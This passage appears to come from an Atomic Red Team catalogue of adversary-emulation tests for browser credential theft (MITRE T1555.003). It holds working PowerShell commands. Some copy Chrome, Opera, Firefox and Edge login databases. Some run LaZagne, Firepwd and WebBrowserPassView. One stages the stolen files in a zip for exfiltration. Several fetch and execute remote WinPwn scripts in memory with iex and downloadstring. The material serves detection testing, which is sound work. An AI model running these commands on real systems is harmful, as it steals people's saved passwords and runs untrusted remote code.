Adapted from [MITRE ATTACK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilit
ies/credential-access/e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d.yml)

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
Set-Location -path "#{file_path}\Sysinternals";
./accesschk.exe -accepteula .;
Command (with inputs):
Set-Location -path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\Sysinternals";
./accesschk.exe -accepteula .;

Cleanup Commands:
Command:
Remove-Item "#{file_path}\Sysinternals" -Force -Recurse -ErrorAction Ignore
Command (with inputs):
Remove-Item "C:\AtomicRedTeam\atomics\..\ExternalPayloads\Sysinternals" -Force -Recurse -ErrorAction Ignore

Dependencies:
Description: Modified Sysinternals must be located at C:\AtomicRedTeam\atomics\..\ExternalPayloads
Check Prereq Command:
if (Test-Path "#{file_path}\SysInternals") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\SysInternals") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest "https://github.com/mitre-attack/attack-arsenal/raw/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/Modified-SysIntern
alsSuite.zip" -OutFile "#{file_path}\Modified-SysInternalsSuite.zip"
Expand-Archive "#{file_path}\Modified-SysInternalsSuite.zip" "#{file_path}\sysinternals" -Force
Remove-Item "#{file_path}\Modified-SysInternalsSuite.zip" -Force
Get Prereq Command (with inputs):
New-Item -Type Directory "C:\AtomicRedTeam\atomics\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest "https://github.com/mitre-attack/attack-arsenal/raw/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/Modified-SysIntern
alsSuite.zip" -OutFile "C:\AtomicRedTeam\atomics\..\ExternalPayloads\Modified-SysInternalsSuite.zip"
Expand-Archive "C:\AtomicRedTeam\atomics\..\ExternalPayloads\Modified-SysInternalsSuite.zip" "C:\AtomicRedTeam\atomics\..\ExternalPayloads\sysinternals" -Force
Remove-Item "C:\AtomicRedTeam\atomics\..\ExternalPayloads\Modified-SysInternalsSuite.zip" -Force
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Credentials from Password Stores: Credentials from Web Browsers T1555.003
Atomic Test Name: LaZagne - Credentials from Browser
Atomic Test Number: 3
Atomic Test GUID: 9a2915b3-3954-4cce-8c76-00fbf4dbd014
Description: The following Atomic test utilizes [LaZagne](https://github.com/AlessandroZ/LaZagne) to extract passwords from browsers on the Windows operating system. LaZagne is an op
en source application used to retrieve passwords stored on a local computer.

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
"#{lazagne_path}" browsers
Command (with inputs):
"C:\AtomicRedTeam\atomics\T1555.003\bin\LaZagne.exe" browsers

Dependencies:
Description: LaZagne.exe must exist on disk at specified location (C:\AtomicRedTeam\atomics\T1555.003\bin\LaZagne.exe)
Check Prereq Command:
if (Test-Path "#{lazagne_path}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\T1555.003\bin\LaZagne.exe") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "#{lazagne_path}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -OutFile "#{lazagne_path}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "C:\AtomicRedTeam\atomics\T1555.003\bin\LaZagne.exe") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -OutFile "C:\AtomicRedTeam\atomics\T1555.003\bin\LaZagne.exe"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Credentials from Password Stores: Credentials from Web Browsers T1555.003
Atomic Test Name: Simulating access to Chrome Login Data
Atomic Test Number: 4
Atomic Test GUID: 3d111226-d09a-4911-8715-fe11664f960d
Description: Simulates an adversary accessing encrypted credentials from Google Chrome Login database.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -Destination "PathToAtomicsFolder\..\ExternalPayloads"
Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data For Account" -Destination "PathToAtomicsFolder\..\ExternalPayloads"
Command (with inputs):
Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -Destination "C:\AtomicRedTeam\atomics\..\ExternalPayloads"
Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data For Account" -Destination "C:\AtomicRedTeam\atomics\..\ExternalPayloads"

Cleanup Commands:
Command:
Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Login Data" -Force -ErrorAction Ignore
Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Login Data For Account" -Force -ErrorAction Ignore
Command (with inputs):
Remove-Item -Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\Login Data" -Force -ErrorAction Ignore
Remove-Item -Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\Login Data For Account" -Force -ErrorAction Ignore

Dependencies:
Description: Chrome must be installed
Check Prereq Command:
if ((Test-Path "C:\Program Files\Google\Chrome\Application\chrome.exe") -Or (Test-Path "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe")) {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
$installer = "PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi"
Invoke-WebRequest -OutFile "PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi
msiexec /i $installer /qn
Start-Process -FilePath "chrome.exe"
Stop-Process -Name "chrome"
Get Prereq Command (with inputs):
New-Item -Type Directory "C:\AtomicRedTeam\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
$installer = "C:\AtomicRedTeam\atomics\..\ExternalPayloads\ChromeStandaloneSetup64.msi"
Invoke-WebRequest -OutFile "C:\AtomicRedTeam\atomics\..\ExternalPayloads\ChromeStandaloneSetup64.msi" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi
msiexec /i $installer /qn
Start-Process -FilePath "chrome.exe"
Stop-Process -Name "chrome"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Credentials from Password Stores: Credentials from Web Browsers T1555.003
Atomic Test Name: Simulating access to Opera Login Data
Atomic Test Number: 5
Atomic Test GUID: 28498c17-57e4-495a-b0be-cc1e36de408b
Description: Simulates an adversary accessing encrypted credentials from Opera web browser's login database.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
Copy-Item "$env:APPDATA\Opera Software\Opera Stable\Login Data" -Destination "PathToAtomicsFolder\..\ExternalPayloads"
Command (with inputs):
Copy-Item "$env:APPDATA\Opera Software\Opera Stable\Login Data" -Destination "C:\AtomicRedTeam\atomics\..\ExternalPayloads"

Cleanup Commands:
Command:
Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Login Data" -Force -ErrorAction Ignore
Command (with inputs):
Remove-Item -Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\Login Data" -Force -ErrorAction Ignore

Dependencies:
Description: Opera must be installed
Check Prereq Command:
if (((Test-Path "$env:LOCALAPPDATA\Programs\Opera\launcher.exe") -Or (Test-Path "C:\Program Files\Opera\launcher.exe") -Or (Test-Path "C:\Program Files (x86)\Opera\launcher.exe"))) {
exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
$installer = "PathToAtomicsFolder\..\ExternalPayloads\OperaStandaloneInstaller.exe"
Invoke-WebRequest -OutFile "PathToAtomicsFolder\..\ExternalPayloads\OperaStandaloneInstaller.exe" https://get.geo.opera.com/pub/opera/desktop/82.0.4227.43/win/Opera_82.0.4227.43_Setu
p.exe
Start-Process $installer -ArgumentList '/install /silent /launchopera=1 /setdefaultbrowser=0'
Start-Sleep -s 180
Stop-Process -Name "opera"
Get Prereq Command (with inputs):
New-Item -Type Directory "C:\AtomicRedTeam\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
$installer = "C:\AtomicRedTeam\atomics\..\ExternalPayloads\OperaStandaloneInstaller.exe"
Invoke-WebRequest -OutFile "C:\AtomicRedTeam\atomics\..\ExternalPayloads\OperaStandaloneInstaller.exe" https://get.geo.opera.com/pub/opera/desktop/82.0.4227.43/win/Opera_82.0.4227.43
_Setup.exe
Start-Process $installer -ArgumentList '/install /silent /launchopera=1 /setdefaultbrowser=0'
Start-Sleep -s 180
Stop-Process -Name "opera"
Description: Opera login data file must exist
Check Prereq Command:
if (Test-Path "$env:APPDATA\Opera Software\Opera Stable\Login Data") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Path "$env:APPDATA\Opera Software\Opera Stable\Login Data" -ItemType File
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Credentials from Password Stores: Credentials from Web Browsers T1555.003
Atomic Test Name: Simulating access to Windows Firefox Login Data
Atomic Test Number: 6
Atomic Test GUID: eb8da98a-2e16-4551-b3dd-83de49baa14c
Description: Simulates an adversary accessing encrypted credentials from firefox web browser's login database. more info in https://support.mozilla.org/en-US/kb/profiles-where-firefo
x-stores-user-data

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
Copy-Item "$env:APPDATA\Mozilla\Firefox\Profiles\" -Destination "PathToAtomicsFolder\..\ExternalPayloads" -Force -Recurse
Command (with inputs):
Copy-Item "$env:APPDATA\Mozilla\Firefox\Profiles\" -Destination "C:\AtomicRedTeam\atomics\..\ExternalPayloads" -Force -Recurse

Cleanup Commands:
Command:
Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Profiles" -Force -ErrorAction Ignore -Recurse
Command (with inputs):
Remove-Item -Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\Profiles" -Force -ErrorAction Ignore -Recurse

Dependencies:
Description: Firefox must be installed
Check Prereq Command:
if ((Test-Path "C:\Program Files\Mozilla Firefox\firefox.exe") -Or (Test-Path "C:\Program Files (x86)\Mozilla Firefox\firefox.exe")) {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {$url="https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=en-US"}else {$url="https://download.mozilla.org/?product=fi
refox-latest-ssl&os=win&lang=en-US"}
$installer = "PathToAtomicsFolder\..\ExternalPayloads\firefoxsetup.exe"
(New-Object Net.WebClient).DownloadFile($url,$installer)
Start-Process $installer -ArgumentList '/S' -Wait
Get Prereq Command (with inputs):
New-Item -Type Directory "C:\AtomicRedTeam\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {$url="https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=en-US"}else {$url="https://download.mozilla.org/?product=fi
refox-latest-ssl&os=win&lang=en-US"}
$installer = "C:\AtomicRedTeam\atomics\..\ExternalPayloads\firefoxsetup.exe"
(New-Object Net.WebClient).DownloadFile($url,$installer)
Start-Process $installer -ArgumentList '/S' -Wait
Description: Firefox login data file must exist
Check Prereq Command:
if (Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\") {exit 0} else {exit 1}
Get Prereq Command:
if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {$firefox="C:\Program Files\Mozilla Firefox\firefox.exe"}else {$firefox="C:\Program Files (x86)\Mozilla Firefox\firefox.exe"}
Start-Process $firefox -ArgumentList '-CreateProfile Atomic' -Wait
Start-Process $firefox -NoNewWindow
Start-Sleep -s 20
Stop-Process -Name firefox
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Credentials from Password Stores: Credentials from Web Browsers T1555.003
Atomic Test Name: Simulating access to Windows Edge Login Data
Atomic Test Number: 7
Atomic Test GUID: a6a5ec26-a2d1-4109-9d35-58b867689329
Description: Simulates an adversary accessing encrypted credentials from Edge web browser's login database. more info in https://www.forensicfocus.com/articles/chromium-based-microso
ft-edge-from-a-forensic-point-of-view/

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default" -Destination "PathToAtomicsFolder\..\ExternalPayloads\Edge" -Force -Recurse
Command (with inputs):
Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default" -Destination "C:\AtomicRedTeam\atomics\..\ExternalPayloads\Edge" -Force -Recurse

Cleanup Commands:
Command:
Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Edge" -Force -ErrorAction Ignore -Recurse
Command (with inputs):
Remove-Item -Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\Edge" -Force -ErrorAction Ignore -Recurse

Dependencies:
Description: Edge must be installed
Check Prereq Command:
if (Test-Path "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe") {exit 0} else {exit 1}
Get Prereq Command:
"Installation is not implemented as Edge is a part of windows"
Description: Edge login data file must exist
Check Prereq Command:
if (Test-Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default") {exit 0} else {exit 1}
Get Prereq Command:
$edge="C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
Start-Process $edge 
Start-Sleep -s 20
Stop-Process -Name msedge
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Credentials from Password Stores: Credentials from Web Browsers T1555.003
Atomic Test Name: Decrypt Mozilla Passwords with Firepwd.py
Atomic Test Number: 8
Atomic Test GUID: dc9cd677-c70f-4df5-bd1c-f114af3c2381
Description: Firepwd.py is a script that can decrypt Mozilla (Thunderbird, Firefox) passwords. Upon successful execution, the decrypted credentials will be output to a text file, as 
well as displayed on screen.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$PasswordDBLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\"
cmd /c #{Firepwd_Path} -d $PasswordDBLocation > #{Out_Filepath}
cat #{Out_Filepath}
Command (with inputs):
$PasswordDBLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\"
cmd /c C:\AtomicRedTeam\atomics\..\ExternalPayloads\Firepwd.py -d $PasswordDBLocation > $env:temp\T1555.003Test8.txt
cat $env:temp\T1555.003Test8.txt

Cleanup Commands:
Command:
Remove-Item -Path "#{Out_Filepath}" -erroraction silentlycontinue
Command (with inputs):
Remove-Item -Path "$env:temp\T1555.003Test8.txt" -erroraction silentlycontinue

Dependencies:
Description: Firepwd must exist at C:\AtomicRedTeam\atomics\..\ExternalPayloads\Firepwd.py
Check Prereq Command:
if (Test-Path "#{Firepwd_Path}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\Firepwd.py") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
Invoke-WebRequest "https://raw.githubusercontent.com/lclevy/firepwd/167eabf3b88d5a7ba8b8bc427283f827b6885982/firepwd.py" -outfile "#{Firepwd_Path}"
Get Prereq Command (with inputs):
New-Item -Type Directory "C:\AtomicRedTeam\atomics\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
Invoke-WebRequest "https://raw.githubusercontent.com/lclevy/firepwd/167eabf3b88d5a7ba8b8bc427283f827b6885982/firepwd.py" -outfile "C:\AtomicRedTeam\atomics\..\ExternalPayloads\Firepw
d.py"
Description: Firefox profile directory must be present
Check Prereq Command:
if (get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\" -erroraction silentlycontinue) {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://ftp.mozilla.org/pub/firefox/releases/98.0/win64/en-US/Firefox%20Setup%2098.0.msi" -outfile "PathToAtomicsFolder\..\ExternalPayloads\firefox.msi"
msiexec.exe /i "PathToAtomicsFolder\..\ExternalPayloads\firefox.msi" /quiet
sleep -s 30
start-process "$env:programfiles\Mozilla Firefox\firefox.exe".
sleep -s 5
stop-process -name "firefox"
Get Prereq Command (with inputs):
New-Item -Type Directory "C:\AtomicRedTeam\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://ftp.mozilla.org/pub/firefox/releases/98.0/win64/en-US/Firefox%20Setup%2098.0.msi" -outfile "C:\AtomicRedTeam\atomics\..\ExternalPayloads\firefox.msi"
msiexec.exe /i "C:\AtomicRedTeam\atomics\..\ExternalPayloads\firefox.msi" /quiet
sleep -s 30
start-process "$env:programfiles\Mozilla Firefox\firefox.exe".
sleep -s 5
stop-process -name "firefox"
Description: Visual Studio Build Tools command prompt must exist at C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat
Check Prereq Command:
if (Test-Path "#{VS_CMD_Path}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
invoke-webrequest "https://aka.ms/vs/17/release/vs_BuildTools.exe" -outfile "PathToAtomicsFolder\..\ExternalPayloads\VS_BuildTools.exe"
write-host "Visual Studio Build Tools (Desktop Development with C++) must be installed manually. Please run the installer from PathToAtomicsFolder\..\ExternalPayloads\VS_BuildTools.e
xe."
Get Prereq Command (with inputs):
New-Item -Type Directory "C:\AtomicRedTeam\atomics\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
invoke-webrequest "https://aka.ms/vs/17/release/vs_BuildTools.exe" -outfile "C:\AtomicRedTeam\atomics\..\ExternalPayloads\VS_BuildTools.exe"
write-host "Visual Studio Build Tools (Desktop Development with C++) must be installed manually. Please run the installer from C:\AtomicRedTeam\atomics\..\ExternalPayloads\VS_BuildTo
ols.exe."
Description: Python must be installed
Check Prereq Command:
if (Test-Path "#{Python_Path}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\Program Files\Python310\python.exe") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
invoke-webrequest "https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe" -outfile "PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe"
Start-Process -FilePath "PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0" -Wait
Get Prereq Command (with inputs):
New-Item -Type Directory "C:\AtomicRedTeam\atomics\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
invoke-webrequest "https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe" -outfile "C:\AtomicRedTeam\atomics\..\ExternalPayloads\python_setup.exe"
Start-Process -FilePath "C:\AtomicRedTeam\atomics\..\ExternalPayloads\python_setup.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0" -Wait
Description: Pip must be installed.
Check Prereq Command:
$env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path
","User"))
if (pip -v) {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
invoke-webrequest "https://bootstrap.pypa.io/ez_setup.py" -outfile "PathToAtomicsFolder\..\ExternalPayloads\ez_setup.py"      
invoke-webrequest "https://bootstrap.pypa.io/get-pip.py" -outfile "PathToAtomicsFolder\..\ExternalPayloads\get-pip.py"
cmd /c "PathToAtomicsFolder\..\ExternalPayloads\ez_setup.py"
cmd /c "PathToAtomicsFolder\..\ExternalPayloads\get-pip.py"
Get Prereq Command (with inputs):
New-Item -Type Directory "C:\AtomicRedTeam\atomics\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
invoke-webrequest "https://bootstrap.pypa.io/ez_setup.py" -outfile "C:\AtomicRedTeam\atomics\..\ExternalPayloads\ez_setup.py"      
invoke-webrequest "https://bootstrap.pypa.io/get-pip.py" -outfile "C:\AtomicRedTeam\atomics\..\ExternalPayloads\get-pip.py"
cmd /c "C:\AtomicRedTeam\atomics\..\ExternalPayloads\ez_setup.py"
cmd /c "C:\AtomicRedTeam\atomics\..\ExternalPayloads\get-pip.py"
Description: Pycryptodome library must be installed
Check Prereq Command:
$env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path
","User"))
if (pip show pycryptodome) {exit 0} else {exit 1}
Get Prereq Command:
$env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path
","User"))
if (test-path "#{VS_CMD_Path}"){pip install pycryptodome | out-null | cmd /c %comspec% /k "#{VS_CMD_Path}" | out-null} else {write-host "Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq"}
Get Prereq Command (with inputs):
$env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path
","User"))
if (test-path "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat"){pip install pycryptodome | out-null | cmd /c %comspec% /k "C:\Program 
Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat" | out-null} else {write-host "Visual Studio Build Tools (C++ Support) must be installed to contin
ue gathering this prereq"}
Description: Pyasn1 library must be installed
Check Prereq Command:
$env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path
","User"))
if (pip show pyasn1) {exit 0} else {exit 1}
Get Prereq Command:
$env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path
","User"))
if (test-path "#{VS_CMD_Path}"){pip install pyasn1 | out-null | cmd /c %comspec% /k "#{VS_CMD_Path}" | out-null} else {write-host "Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq."}
Get Prereq Command (with inputs):
$env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path
","User"))
if (test-path "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat"){pip install pyasn1 | out-null | cmd /c %comspec% /k "C:\Program Files 
(x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat" | out-null} else {write-host "Visual Studio Build Tools (C++ Support) must be installed to continue gat
hering this prereq."}
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Credentials from Password Stores: Credentials from Web Browsers T1555.003
Atomic Test Name: Stage Popular Credential Files for Exfiltration
Atomic Test Number: 10
Atomic Test GUID: f543635c-1705-42c3-b180-efd6dc6e7ee7
Description: This test is designed to search a drive for credential files used by the most common web browsers on Windows (Firefox, Chrome, Opera, and Edge), export the found files t
o a folder, and zip it, simulating how an adversary might stage sensitive credential files for exfiltration in order to conduct offline password extraction with tools like [firepwd.p
y](https://github.com/lclevy/firepwd) or [HackBrowserData](https://github.com/moonD4rk/HackBrowserData).

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$exfil_folder = "$env:temp\T1555.003"
if (test-path "$exfil_folder") {} else {new-item -path "$env:temp" -Name "T1555.003" -ItemType "directory" -force}
$FirefoxCredsLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\"
if (test-path "$FirefoxCredsLocation\key4.db") {copy-item "$FirefoxCredsLocation\key4.db" -destination "$exfil_folder\T1555.003Firefox_key4.db"} else {}
if (test-path "$FirefoxCredsLocation\logins.json") {copy-item "$FirefoxCredsLocation\logins.json" -destination "$exfil_folder\T1555.003Firefox_logins.json"} else {}
if (test-path "$env:localappdata\Google\Chrome\User Data\Default\Login Data") {copy-item "$env:localappdata\Google\Chrome\User Data\Default\Login Data" -destination "$exfil_folder\T1
555.003Chrome_Login Data"} else {}
if (test-path "$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account") {copy-item "$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account" -desti
nation "$exfil_folder\T1555.003Chrome_Login Data For Account"} else {}
if (test-path "$env:appdata\Opera Software\Opera Stable\Login Data") {copy-item "$env:appdata\Opera Software\Opera Stable\Login Data" -destination "$exfil_folder\T1555.003Opera_Login
 Data"} else {}
if (test-path "$env:localappdata/Microsoft/Edge/User Data/Default/Login Data") {copy-item "$env:localappdata/Microsoft/Edge/User Data/Default/Login Data" -destination "$exfil_folder\
T1555.003Edge_Login Data"} else {} 
compress-archive -path "$exfil_folder" -destinationpath "$exfil_folder.zip" -force

Cleanup Commands:
Command:
Remove-Item -Path "$env:temp\T1555.003.zip" -force -erroraction silentlycontinue   
Remove-Item -Path "$env:temp\T1555.003\" -force -recurse -erroraction silentlycontinue
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Credentials from Password Stores: Credentials from Web Browsers T1555.003
Atomic Test Name: WinPwn - BrowserPwn
Atomic Test Number: 11
Atomic Test GUID: 764ea176-fb71-494c-90ea-72e9d85dce76
Description: Collect Browser credentials as well as the history via winpwn browserpwn function of WinPwn.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
browserpwn -consoleoutput -noninteractive

Cleanup Commands:
Command:
rm .\System.Data.SQLite.dll -ErrorAction Ignore
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Credentials from Password Stores: Credentials from Web Browsers T1555.003
Atomic Test Name: WinPwn - Loot local Credentials - mimi-kittenz
Atomic Test Number: 12
Atomic Test GUID: ec1d0b37-f659-4186-869f-31a554891611
Description: Loot local Credentials - mimi-kittenz technique via function of WinPwn - Extend timeout to 600s

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
kittenz -consoleoutput -noninteractive
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Credentials from Password Stores: Credentials from Web Browsers T1555.003
Atomic Test Name: WinPwn - PowerSharpPack - Sharpweb for Browser Credentials
Atomic Test Number: 13
Atomic Test GUID: e5e3d639-6ea8-4408-9ecd-d5a286268ca0
Description: PowerSharpPack - Sharpweb searching for Browser Credentials technique via function of WinPwn

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')
Invoke-Sharpweb -command "all"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Credentials from Password Stores: Credentials from Web Browsers T1555.003
Atomic Test Name: WebBrowserPassView - Credentials from Browser
Atomic Test Number: 15
Atomic Test GUID: e359627f-2d90-4320-ba5e-b0f878155bbe
Description: The following Atomic test utilizes WebBrowserPassView to extract passwords from browsers on a Window system. WebBrowserPassView is an open source application used to ret
rieve passwords stored on a local computer. Recently noticed as a tool used in the BlackCat Ransomware.

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
Start-Process "#{webbrowserpassview_path}"
Start-Sleep -Second 4
Stop-Process -Name "WebBrowserPassView"
Command (with inputs):
Start-Process "C:\AtomicRedTeam\atomics\T1555.003\bin\WebBrowserPassView.exe"
Start-Sleep -Second 4
Stop-Process -Name "WebBrowserPassView"

Dependencies:
Description: Check if WebBrowserPassView.exe exists in the specified path C:\AtomicRedTeam\atomics\T1555.003\bin\WebBrowserPassView.exe
Check Prereq Command:
